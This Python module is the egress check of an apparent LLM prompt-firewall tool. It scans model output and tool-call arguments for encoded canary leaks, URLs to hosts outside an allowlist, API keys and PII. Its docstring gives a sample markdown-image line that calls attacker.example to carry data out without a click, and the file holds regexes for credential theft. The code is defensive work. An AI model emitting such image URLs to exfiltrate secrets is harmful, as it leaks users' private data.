"""egress: what leaves the model. INVARIANT for canaries and URLs, SCORED for secrets / PII.

Canary closure
    A registered secret ("canary") must not leave in ANY encoding. Instead of one rule per
    trick, every reading of the output (decoded, rot13, reversed, separators stripped...)
    is reduced to lowercase alphanumerics and searched for the canary. This catches
    "V-A-N-T-A-G-E", base64("-".join(secret)) and "-".join(base64(secret)) alike.

URL control
    `![x](https://attacker.example/?d=DATA)` is the zero-click exfiltration primitive:
    the chat client fetches the image on render and the data leaves without a click.
    Any URL to a host outside the allowlist is a hard stop. The decision is based on the
    host, not on how suspicious the URL looks.

Secrets / PII (addition to the original design)
    API keys, private keys, JWTs, e-mails, phone numbers, IBAN, card numbers (Luhn).
    Scored, because a model is sometimes legitimately asked to output an e-mail address.
"""

from __future__ import annotations

import json
import re
from urllib.parse import urlparse

from promptfw.context import Context
from promptfw.normalize import canonical, readings, strip_to_alnum
from promptfw.policy import Policy
from promptfw.tools import AgentReply
from promptfw.verdict import Finding, Severity

NAME = "egress"

_URL = re.compile(r"(?i)(?<![\w/])(?:(?:https?|ftp|wss?):)?//([a-z0-9.-]+\.[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?::\d+)?[^\s)\"'<>]*")
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s>]+)")

SECRET_PATTERNS: list[tuple[str, str, float, re.Pattern]] = [
    ("aws-key", "AWS access key", 0.9, re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("private-key", "Private key block", 0.95, re.compile(r"-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    ("llm-api-key", "OpenAI / Anthropic style API key", 0.9, re.compile(r"\bsk-(ant-|proj-)?[A-Za-z0-9_-]{20,}")),
    ("github-token", "GitHub token", 0.9, re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b")),
    ("slack-token", "Slack token", 0.9, re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b")),
    ("jwt", "JSON Web Token", 0.7, re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("credential-assignment", "Credential assignment", 0.5,
     re.compile(r"(?i)\b(password|passwd|pwd|secret|api[_-]?key|token|mot de passe)\s*[:=]\s*['\"]?[^\s'\"]{8,}")),
]
PII_PATTERNS: list[tuple[str, str, re.Pattern]] = [
    ("email", "E-mail address", re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]{2,}\b")),
    ("phone-fr", "French phone number", re.compile(r"(?<!\d)(?:\+33\s?|0)[1-9](?:[\s.-]?\d{2}){4}(?!\d)")),
    ("iban", "IBAN", re.compile(r"\b[A-Z]{2}\d{2}(?:\s?[A-Z0-9]{4}){3,7}(?:\s?[A-Z0-9]{1,3})?\b")),
    ("card", "Payment card number", re.compile(r"(?<!\d)(?:\d[ -]?){13,19}(?!\d)")),
]
PII_SCORE = 0.3


def luhn_ok(number: str) -> bool:
    digits = [int(d) for d in number if d.isdigit()]
    if not 13 <= len(digits) <= 19:
        return False
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2:
            d = d * 2 - 9 if d > 4 else d * 2
        total += d
    return total % 10 == 0


def host_allowed(host: str, allowed: tuple[str, ...]) -> bool:
    host = host.lower().rstrip(".")
    return any(host == a or host.endswith("." + a) for a in allowed)


def reply_surfaces(reply: AgentReply) -> list[tuple[str, str]]:
    """Everything the model emits: prose AND tool arguments (a secret can leave via send_email)."""
    out = [("text", reply.text)] if reply.text else []
    for call in reply.tool_calls:
        out.append((f"tool:{call.name}", json.dumps(call.args, ensure_ascii=False)))
    return out


class EgressLayer:
    name = NAME

    def inspect(self, reply: AgentReply, ctx: Context, policy: Policy,
                extra_canaries: tuple[str, ...] = ()) -> list[Finding]:
        findings: list[Finding] = []
        canaries = [c for c in (*policy.canaries, *extra_canaries) if c]
        for where, text in reply_surfaces(reply):
            findings += self._canaries(text, where, canaries)
            findings += self._urls(text, where, policy)
            if policy.detect_secrets:
                findings += self._secrets(text, where)
            if policy.detect_pii and where == "text":
                findings += self._pii(text, where)
        return findings

    # -------------------------------------------------------------- canaries
    def _canaries(self, text: str, where: str, canaries: list[str]) -> list[Finding]:
        if not canaries:
            return []
        keys = [strip_to_alnum(c) for c in canaries]
        for reading in readings(text, "egress"):
            flat = strip_to_alnum(reading.text)
            for key in keys:
                if key and key in flat:
                    return [Finding(NAME, "canary-leak", Severity.CRITICAL, True, 1.0, reading=reading.path,
                                    evidence="<canary>", message=f"Registered canary found in {where}")]
        return []

    # -------------------------------------------------------------- URLs
    def _urls(self, text: str, where: str, policy: Policy) -> list[Finding]:
        findings: list[Finding] = []
        image_hosts = {(urlparse(u if "//" in u else "//" + u).hostname or "").lower()
                       for u in _MD_IMAGE.findall(canonical(text))}
        seen: set[str] = set()
        for m in _URL.finditer(canonical(text)):
            host = m.group(1).lower()
            if host in seen or host_allowed(host, policy.allowed_hosts):
                continue
            seen.add(host)
            is_image = host in image_hosts
            has_query = "?" in m.group(0) or "=" in m.group(0)
            if is_image:
                findings.append(Finding(NAME, "markdown-image", Severity.CRITICAL, True, 1.0,
                                        evidence=host, message=f"Auto-loaded image to non-allowlisted host in {where}"))
            elif policy.enforce_url_allowlist:
                findings.append(Finding(NAME, "url-not-allowlisted", Severity.HIGH, True, 1.0,
                                        evidence=host, message=f"URL to non-allowlisted host in {where}"))
            elif has_query:
                findings.append(Finding(NAME, "url-with-query", Severity.MEDIUM, False, 0.4,
                                        evidence=host, message=f"URL with query string to unknown host in {where}"))
        return findings

    # -------------------------------------------------------------- secrets / PII
    def _secrets(self, text: str, where: str) -> list[Finding]:
        out = []
        for rule, label, score, pat in SECRET_PATTERNS:
            m = pat.search(text)
            if m:
                out.append(Finding(NAME, f"secret-{rule}", Severity.HIGH if score >= 0.7 else Severity.MEDIUM,
                                   False, score, evidence=m.group(0)[:4] + "...",
                                   message=f"{label} in {where} [LLM02]"))
        return out

    def _pii(self, text: str, where: str) -> list[Finding]:
        out = []
        for rule, label, pat in PII_PATTERNS:
            for m in pat.finditer(text):
                if rule == "card" and not luhn_ok(m.group(0)):
                    continue
                out.append(Finding(NAME, f"pii-{rule}", Severity.LOW, False, PII_SCORE,
                                   evidence=m.group(0)[:3] + "...", message=f"{label} in {where} [LLM02]"))
                break
        return out
